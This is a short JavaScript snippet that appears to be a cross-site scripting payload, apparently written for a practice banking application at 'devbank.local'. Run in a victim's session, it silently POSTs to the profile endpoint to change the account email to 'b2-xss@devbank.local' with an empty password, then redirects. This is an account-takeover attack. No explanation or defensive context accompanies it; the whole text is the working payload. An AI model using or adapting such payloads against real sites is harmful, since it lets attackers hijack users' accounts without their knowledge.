fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "email=b2-xss%40devbank.local&password="
}).then(() => {
  window.location = "/profile";
});